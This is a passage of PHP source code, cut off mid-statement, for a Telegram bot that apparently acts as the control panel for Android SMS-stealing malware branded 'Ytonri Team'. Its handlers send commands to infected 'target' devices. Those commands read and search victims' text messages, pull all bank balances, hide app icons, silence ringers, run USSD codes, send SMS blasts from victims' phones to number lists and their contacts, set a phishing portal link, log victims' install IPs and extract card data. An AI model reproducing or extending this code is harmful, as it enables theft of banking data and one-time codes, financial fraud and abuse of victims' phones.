        emg($chat_id, $mi, "<blockquote>☠️ ‹‹ <b>ᴍᴏᴅᴇʟ ꜱᴇɴᴅ ᴏɴʟɪɴᴇ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n\n<blockquote>💀 ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ 🎭</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $model_button);
        
    } elseif ($data == "list_model") {
        emg($chat_id, $mi, "<blockquote>⚡ ‹‹ <b>ʟɪꜱᴛ ꜱᴇɴᴅᴇᴅ</b> ›› ꜱᴇᴄᴛɪᴏɴ ꜱᴇʟᴇᴄᴛᴇᴅ</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_settings);
        file_put_contents("data/online_model.txt", "list");
        
    } elseif ($data == "singel_model") {
        emg($chat_id, $mi, "<blockquote>☠️ ‹‹ <b>ꜱɪɴɢᴇʟ ꜱᴇɴᴅᴇᴅ</b> ›› ꜱᴇᴄᴛɪᴏɴ ꜱᴇʟᴇᴄᴛᴇᴅ</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_settings);
        file_put_contents("data/online_model.txt", "singel");
        
    } elseif ($data == "autotar") {
        if ($auto_tar == "on") {
            file_put_contents("data/autotar.txt", "off");
            emg($chat_id, $mi, "<blockquote>🔌 ‹‹ <b>ᴏꜰꜰ ᴍᴏᴅᴇ</b> ›› ꜱᴇᴛ ᴛᴏ <b>ᴏꜰꜰ</b></blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_settings);
        } else {
            file_put_contents("data/autotar.txt", "on");
            emg($chat_id, $mi, "<blockquote>🔛 ‹‹ <b>ᴏꜰꜰ ᴍᴏᴅᴇ</b> ›› ꜱᴇᴛ ᴛᴏ <b>ᴏɴ</b></blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_settings);
        }
        
    } elseif (isset($text) && strpos($text, '/block_') !== false) {
        $dev_id0 = str_replace('/block_', '', $text);
        $ip_block = $dev_id0;
        $file_accses = file_get_contents("block.txt");
        file_put_contents("block.txt", "$file_accses\n$ip_block");
        smg($chat_id, "<blockquote>🔮 ‹‹ ɪᴘ <b>$ip_block</b> ʙʟᴏᴄᴋᴇᴅ ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", null);
        
    } elseif (isset($text) && strpos($text, '/unblock_') !== false) {
        $dev_id0 = str_replace('/unblock_', '', $text);
        $ip_block = $dev_id0;
        $file_content = file_get_contents("block.txt");
        $new_content = str_replace($ip_block, '', $file_content);
        file_put_contents("block.txt", $new_content);
        smg($chat_id, "<blockquote>⚡ ‹‹ ɪᴘ <b>$ip_block</b> ᴜɴʙʟᴏᴄᴋᴇᴅ ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", null);
        
    } elseif ($data == "set_text") {
        emg($chat_id, $mi, "<blockquote>⚡ ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set text");
        
    } elseif ($command == "set text") {
        smg($chat_id, "<blockquote>🩸 <b>ꜱᴍꜱ ᴛᴇxᴛ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("data/message-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "set_number") {
        emg($chat_id, $mi, "<blockquote>📲 <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ɴᴜᴍʙᴇʀ</b></blockquote>\n\n<blockquote>ᴇxᴀᴍᴘʟᴇ: <code>09123456789</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set number");
        
    } elseif ($command == "set number") {
        smg($chat_id, "<blockquote>👁️ <b>ꜱᴍꜱ ɴᴜᴍʙᴇʀ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("data/number-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "set_number_offline_mode") {
        emg($chat_id, $mi, "<blockquote>🔮 <b>ꜱᴇᴛ ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱɪᴍ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱɪᴍ ᴄᴀʀᴅ ɴᴜᴍʙᴇʀ</blockquote>\n<blockquote>ᴇxᴀᴍᴘʟᴇ: <code>09123456789</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set offline");
        
    } elseif ($command == "set offline") {
        smg($chat_id, "<blockquote>👁️ <b>ᴏꜰꜰʟɪɴᴇ ꜱɪᴍ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("data/offline-number.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "checkhost") {
        emg($chat_id, $mi, "<blockquote><b>ᴄʜᴇᴄᴋ ᴜʀʟ ꜰʀᴏᴍ ᴄʜᴇᴄᴋ-ʜᴏꜱᴛ.ɴᴇᴛ</b> ᴀʀᴇ ʙᴇɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇᴄᴇɪᴠᴇᴅ, ᴀᴘᴘʀᴏxɪᴍᴀᴛᴇ ᴛɪᴍᴇ : 5 ꜱᴇᴄᴏɴᴅꜱ</blockquote>", $back_settings);
        $check_result = checkhost($link_show);

        $check_result_string = '';
        if (!empty($check_result)) {
            foreach ($check_result as $city => $value) {
                if ($value['statuscode'] == "200" || $value['statuscode'] == "301") {
                    $emoji = "👁️";
                } else {
                    $emoji = "🔮";
                }
                $time = substr($value['time'], 0, 4);
                $check_result_string .= "<blockquote><b>$emoji $city</b> ==>";
                $check_result_string .= "<b>ꜱᴛᴀᴛᴜꜱ</b> : {$value['status']} | {$value['statuscode']}\n";
                $check_result_string .= "<b>ʟᴏᴀᴅ ᴛɪᴍᴇ</b> : $time</blockquote>\n";
                $check_result_string .= "➖➖➖➖➖➖\n";
            }
        } else {
            $check_result_string = "<blockquote>❌ ꜰᴀɪʟᴇᴅ ᴛᴏ ᴄʜᴇᴄᴋ ᴜʀʟ</blockquote>";
        }
        smg($chat_id, $check_result_string, null);
        
    } elseif ($data == "get_all_balance") {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>┌🕸 ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                     . "├☠️ᴍᴏᴅᴇ : ʙᴀʟᴀɴᴄᴇ\n"
                     . "└👁️ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ʙᴀʟᴀɴᴄᴇ</blockquote>\n\n"
                     . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            'parse_mode' => 'HTML'
        ]);
        requests('getallbalance', $device_id);
        
    } elseif ($data == "hide_all") {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>┌👁️ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                     . "├🕸 ᴍᴏᴅᴇ : ʜɪᴅᴇ\n"
                     . "└⚡ ᴄᴏᴍᴍᴀɴᴅ: ʜɪᴅᴇ ᴀʟʟ ɪᴄᴏɴ</blockquote>\n\n"
                     . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            'parse_mode' => 'HTML'
        ]);
        requestsAll('hide_all');
        
    } elseif ($data == "silent_all") {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>┌⚡ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                     . "├👁️ ʀɪɴɢᴇʀ : ꜱɪʟᴇɴᴛ\n"
                     . "└🕸ᴄᴏᴍᴍᴀɴᴅ: ꜱɪʟᴇɴᴛ ᴀʟʟ</blockquote>\n\n"
                     . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            'parse_mode' => 'HTML'
        ]);
        requestsAll('silent_all');
        
    } elseif ($data == "set_url") {
        emg($chat_id, $mi, "<blockquote>👁️ <b>ꜱᴇᴛ ᴘᴏʀᴛᴀʟ ʟɪɴᴋ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ʟɪɴᴋ</blockquote>\n<blockquote>ᴇxᴀᴍᴘʟᴇ: <code>https://example.com</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set url");
        
    } elseif ($command == "set url") {
        smg($chat_id, "<blockquote>👁️ <b>ᴘᴏʀᴛᴀʟ ʟɪɴᴋ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("link.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "sms_all") {
        file_put_contents("user/$chat_id/command.txt", "");
        emg($chat_id, $mi, "<blockquote>👁️ <b>ꜱᴍꜱ ʙᴏᴍʙᴇʀ</b></blockquote>\n\n<blockquote>ᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ: <code>$text_message</code></blockquote>", $sms_button_all);
        
    } elseif ($data == "set_message_contacts") {
        emg($chat_id, $mi, "<blockquote>⚡ <b>ꜱᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴛᴇxᴛ</blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "message_contacts");
        
    } elseif ($command == "message_contacts") {
        file_put_contents("data/message_contacts.txt", $text);
        smg($chat_id, "<blockquote>👁️ <b>ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "edit_message_all") {
        emg($chat_id, $mi, "<blockquote>👁️ <b>ᴇᴅɪᴛ ꜱᴍꜱ ᴛᴇxᴛ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ɴᴇᴡ ᴛᴇxᴛ</blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set message all");
        
    } elseif ($command == "set message all") {
        file_put_contents("user/$chat_id/message.txt", $text);
        smg($chat_id, "<blockquote>👁️ <b>ꜱᴍꜱ ᴛᴇxᴛ ᴜᴘᴅᴀᴛᴇᴅ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "set_list_all") {
        emg($chat_id, $mi, "<blockquote>⚡ <b>ꜱᴇᴛ ɴᴜᴍʙᴇʀ ʟɪꜱᴛ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɴᴜᴍʙᴇʀꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ)</blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set list all");
        
    } elseif ($command == "set list all") {
        file_put_contents("user/$chat_id/numberlist.txt", $text);
        smg($chat_id, "<blockquote>👁️ <b>ɴᴜᴍʙᴇʀ ʟɪꜱᴛ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ꜱʜᴏᴜʟᴅ ᴍᴇꜱꜱᴀɢᴇꜱ ʙᴇ ꜱᴇɴᴛ?</blockquote>", $send_sms_all);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "last_send_all") {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>👁️ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                     . "🕸 ꜱᴍꜱ ᴛᴇxᴛ $text_message\n"
                     . "🩸 ɴᴜᴍʙᴇʀ $number_message\n"
                     . "💀┌ᴍᴏᴅᴇ : ꜱᴇɴᴅ ꜱᴍꜱ"
                     . "🔮└ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴀʟʟ</blockquote>\n\n"
                     . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            'parse_mode' => 'HTML'
        ]);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms_all", null, $str, $text_message);
        
    } elseif (strpos($data, "information") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $info_button = info_button($device_id);
            file_put_contents("user/$chat_id/command.txt", "");
            
            $target_name = file_get_contents("user/$device_id-name.txt") ?: "Unknown";
            $install_ip = file_get_contents("user/$device_id-ip.txt") ?: "N/A";
            
            emg($chat_id, $mi, "<blockquote>👁️ ‹‹ <b>ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n\n"
                . "<blockquote>⚡ ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ : [ <code>$target_name</code> ]</blockquote>\n\n"
                . "<blockquote>🕸 ɪɴꜱᴛᴀʟʟ ɪᴘ : [ <code>$install_ip</code> ]</blockquote>\n\n"
                . "<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", 
            $info_button);
        }
        
    } elseif (strpos($data, "send_sms") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $sms_button = sms_button($device_id);

            file_put_contents("user/$chat_id/command.txt", "");
            emg($chat_id, $mi, "<blockquote>☠️ ‹‹ <b>ꜱᴇɴᴅ ꜱᴍꜱ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n\n<blockquote>⚡ ᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ : [ <code>$text_message</code> ]</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $sms_button);
        }
        
    } elseif (strpos($data, "searchSMS") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
                [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $datass[1]"]]
            ]]);
            emg($chat_id, $mi, "<blockquote>🕸 ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴡᴏʀᴅ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_control);
            file_put_contents("user/$chat_id/command.txt", "setwords $device_id");
        }
        
    } elseif (strpos($data, "ussdcode") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            emg($chat_id, $mi, "<blockquote>📟 ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴄᴏᴅᴇ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_control);
            file_put_contents("user/$chat_id/command.txt", "sendussd $device_id");
        }
        
    } elseif (strpos($command, "setwords") !== false) {
        $datass = explode(" ", $command);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            file_put_contents("user/$chat_id/command.txt", "");
            requestSMS("searchSMS", $device_id, null, $text);
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                         . "🦠ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "👁️ ꜱᴇᴀʀᴄʜ ꜱᴍꜱ -> $text\n"
                         . "🩸ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇᴀʀᴄʜ ꜱᴍꜱ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
        }
        
    } elseif (strpos($command, "sendussd") !== false) {
        $datass = explode(" ", $command);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            $ussd = $text;
            file_put_contents("user/$chat_id/command.txt", "");
            requestSMSContact("ussdcode", $device_id, $ussd);
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🦠ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                         . "🕸ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "👁️ ᴜꜱꜱᴅ ᴄᴏᴅᴇ $ussd\n"
                         . "🩸ᴄᴏᴍᴍᴀɴᴅ: ʀᴜɴ ᴜꜱꜱᴅ ᴄᴏᴅᴇᴛ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
        }
        
    } elseif ($data == "search_all") {
        emg($chat_id, $mi, "<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ᴡᴏʀᴅ ...</b></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set words2");
        
    } elseif ($command == "set words2") {
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("allSearch", $device_id, null, $text);
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>🦠ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                     . "🕸ᴛᴀʀɢᴇᴛ: ᴀʟʟ\n"
                     . "👁️ ꜱᴇᴀʀᴄʜ ꜱᴍꜱ -> $text\n"
                     . "🩸ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇᴀʀᴄʜ ꜱᴍꜱ</blockquote>",
            'parse_mode' => 'HTML'
        ]);
        
    } elseif (strpos($data, "clearinfo") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $info_button = info_button($device_id);
            emg($chat_id, $mi, "<blockquote>🧹 ‹‹ ᴀʟʟ ɪɴꜰᴏ ᴛᴀʀɢᴇᴛ (ɴᴀᴍᴇ) ᴄʜᴀɴɢᴇᴅ ᴛᴏ [ <code>ɴᴜʟʟ</code> ] ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $info_button);
            file_put_contents("user/$device_id-name.txt", "null");
        }
        
    } elseif (strpos($data, "edit_message") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $back_sms = back_sms($device_id);
            emg($chat_id, $mi, "<blockquote>📝 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_sms);
            file_put_contents("user/$chat_id/command.txt", "setmessage $device_id");
        }
        
    } elseif (strpos($command, "setmessage") !== false) {
        $datass = explode(" ", $command);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $back_sms = back_sms($device_id);

            file_put_contents("user/$chat_id/message.txt", $text);
            smg($chat_id, "<blockquote>✅ ‹‹ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ᴛᴏ [ <code>$text</code> ] ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_sms);
            file_put_contents("user/$chat_id/command.txt", "");
        }
        
    } elseif (strpos($data, "set_list") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $back_sms = back_sms($device_id);
            emg($chat_id, $mi, "<blockquote>📋 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ʟɪꜱᴛ ɴᴜᴍʙᴇʀ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_sms);
            file_put_contents("user/$chat_id/command.txt", "setlist $device_id");
        }
        
    } elseif (strpos($command, "setlist") !== false) {
        $datass = explode(" ", $command);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $send_sms = send_sms($device_id);

            file_put_contents("user/$chat_id/numberlist.txt", $text);
            smg($chat_id, "<blockquote>✅ ‹‹ <b>ʟɪꜱᴛ ɴᴜᴍʙᴇʀ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ››</blockquote>\n\n<blockquote>✉️ ꜱʜᴏᴜʟᴅ ᴍᴇꜱꜱᴀɢᴇꜱ ʙᴇ ꜱᴇɴᴛ?</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $send_sms);
            file_put_contents("user/$chat_id/command.txt", "");
        }
        
    } elseif (strpos($data, "last_send") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                         . "💀ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🔮 ꜱᴍꜱ ᴛᴇxᴛ -> $text_message\n"
                         . "⚡ ɴᴜᴍʙᴇʀ -> $number_message\n"
                         . "🕸ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇɴᴅ ꜱᴍꜱ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            $time = explode("\n", $number_message);
            $time = count($time) * 5;
            $str = str_replace("\n", ",", $number_message);
            requestSMS("send_sms", $device_id, $str, $text_message);
        }
        
    } elseif (strpos($data, "status_user") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $message_id = sendCommandWithResponse($chat_id, $device_id, $device_model, "ɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ", "");
            if ($message_id) {
                requests('status', $device_id);
                file_put_contents("user/$device_id-status-msg.txt", "$chat_id|$message_id");
            }
        }
        
    } elseif (strpos($data, "last_sms") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_message = "<blockquote>🕸ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                          . "🦠ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                          . "👁️ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ʟᴀꜱᴛ ꜱᴍꜱ</blockquote>\n\n"
                          . "<blockquote>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</blockquote>";
            
            smg($chat_id, $wait_message, null);
            requests('last_sms', $device_id);
        }
        
    } elseif (strpos($data, "Popo ") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                         . "🦠ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "👁️ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ꜱᴍꜱ ʟɪꜱᴛ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('all_sms', $device_id);
        }
        
    } elseif (strpos($data, "sent") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                         . "🦠ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "👁️ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ᴏᴜᴛ ʙᴏxᴛ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('all_sms_sent', $device_id);
        }
        
    } elseif (strpos($data, "recived") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                         . "🕸ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🦠ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ɪɴ ʙᴏx</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('all_sms_recived', $device_id);
        }
        
    } elseif (strpos($data, "extract_cards") !== false) {  
        $datass = explode(" ", $data);  
        if (isset($datass[1])) {
            $device_id = $datass[1];  
            $device_model = file_get_contents("user/{$device_id}-model.txt") ?? 'ᴜɴᴋɴᴏᴡɴ';  
              
            $wait_message = bot('sendMessage', [  
                'chat_id' => $chat_id,  
                'text' => "<blockquote>┌⚡ ᴘʀᴏᴄᴇꜱꜱɪɴɢ ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ...\n"
                        . "├🕸ᴛᴀʀɢᴇᴛ: ᴅᴇᴠɪᴄᴇ: <code>$device_id</code> | [$device_model]\n"
                        . "└🩸ᴄᴏᴍᴍᴀɴᴅ: <code>ɢᴇᴛᴄᴀʀᴅ</code></blockquote>\n\n"
                        . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",  
                'parse_mode' => 'HTML'  
            ]);  
              
            if ($wait_message && $wait_message->ok) {
                file_put_contents("user/{$device_id}_card_process.txt", json_encode([  
                    'chat_id' => $chat_id,  
                    'message_id' => $wait_message->result->message_id,  
